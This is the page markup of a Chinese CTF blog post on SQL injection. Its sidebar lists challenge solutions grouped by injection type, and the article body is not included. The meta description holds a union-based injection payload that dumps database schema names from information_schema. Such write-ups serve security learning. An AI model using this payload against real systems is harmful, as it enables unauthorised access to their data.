<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>CTF-SQL注入 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.5.3","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Extraderの博客" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="联合查询注入极客大挑战—LoveSQL解题核心 ———————- group_concat() 经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段 查数据库： 1&#39; union select null,null,group_concat(schema_name) from information_schema.schemata ;#  查表： 1&amp;#3">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-SQL注入">
<meta property="og:url" content="https://www.extrader.top/posts/e73517db/index.html">
<meta property="og:site_name" content="Extraderの博客">
<meta property="og:description" content="联合查询注入极客大挑战—LoveSQL解题核心 ———————- group_concat() 经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段 查数据库： 1&#39; union select null,null,group_concat(schema_name) from information_schema.schemata ;#  查表： 1&amp;#3">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20201020140803308.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png">
<meta property="article:published_time" content="2020-03-24T16:00:00.000Z">
<meta property="article:modified_time" content="2020-11-08T04:56:13.686Z">
<meta property="article:author" content="Extrader">
<meta property="article:tag" content="CTF题">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png"><script src="/js/ui/mode.js"></script><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94LoveSQL"><span class="toc-number">1.1.</span> <span class="toc-text">极客大挑战—LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94BabySQL"><span class="toc-number">1.2.</span> <span class="toc-text">极客大挑战—BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019SWPU%E2%80%94Web1"><span class="toc-number">1.3.</span> <span class="toc-text">2019SWPU—Web1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94HardSQL"><span class="toc-number">2.1.</span> <span class="toc-text">极客大挑战—HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk"><span class="toc-number">2.2.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCTF2015-EasySQL"><span class="toc-number">2.3.</span> <span class="toc-text">[RCTF2015]EasySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2020ichunqiu%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E2%80%94blacklist"><span class="toc-number">3.1.</span> <span class="toc-text">2020ichunqiu新春公益赛—blacklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019SUCTF%E2%80%94EasySQL"><span class="toc-number">3.2.</span> <span class="toc-text">2019SUCTF—EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94supersql"><span class="toc-number">3.3.</span> <span class="toc-text">2019强网杯—supersql</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2020ichunqiu%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E2%80%94Ezsqli"><span class="toc-number">4.1.</span> <span class="toc-text">2020ichunqiu新春公益赛—Ezsqli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020ichunqiu%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E2%80%94%E7%AE%80%E5%8D%95%E7%9A%84%E6%8B%9B%E8%81%98%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.2.</span> <span class="toc-text">2020ichunqiu新春公益赛—简单的招聘系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-Web1%E2%80%94Hack-World"><span class="toc-number">4.3.</span> <span class="toc-text">CISCN2019-Web1—Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94FinalSQL"><span class="toc-number">4.4.</span> <span class="toc-text">极客大挑战—FinalSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd%E2%80%94%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">BJDCTF-2nd—简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTFshow%E2%80%94web1"><span class="toc-number">4.6.</span> <span class="toc-text">CTFshow—web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb"><span class="toc-number">4.7.</span> <span class="toc-text">CISCN2019-总决赛-Day2-Web1-Easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.8.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-Login-Only-For-36D"><span class="toc-number">5.1.</span> <span class="toc-text">WEB_Login_Only_For_36D</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XCTF%E2%80%94INSERT-INTO%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">XCTF—INSERT INTO注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020ichunqiu%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E2%80%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.3.</span> <span class="toc-text">2020ichunqiu新春公益赛—盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E2%80%94Unfinish"><span class="toc-number">5.4.</span> <span class="toc-text">网鼎杯2018—Unfinish</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2020ichunqiu%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E2%80%94easysqli-copy"><span class="toc-number">6.1.</span> <span class="toc-text">2020ichunqiu新春公益赛—easysqli_copy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%81%92%E6%9D%AF-%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%E2%80%94BabySqliv2-0"><span class="toc-number">6.2.</span> <span class="toc-text">安恒杯-新春祈福赛—BabySqliv2.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018%E2%80%94Comment"><span class="toc-number">7.1.</span> <span class="toc-text">网鼎杯 2018—Comment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">8.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%81%92%E6%9D%AF-%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%E2%80%94BabySqli"><span class="toc-number">8.1.</span> <span class="toc-text">安恒杯-新春祈福赛—BabySqli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36D%E2%80%94WEB-%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">8.2.</span> <span class="toc-text">36D—WEB_你没见过的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hack-lu-2017-FlatScience"><span class="toc-number">8.3.</span> <span class="toc-text">Hack.lu-2017-FlatScience</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">8.4.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/e73517db/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-SQL注入</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-03-25 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-25T00:00:00+08:00">2020-03-25</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-11-08 12:56:13" itemprop="dateModified" datetime="2020-11-08T12:56:13+08:00">2020-11-08</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use 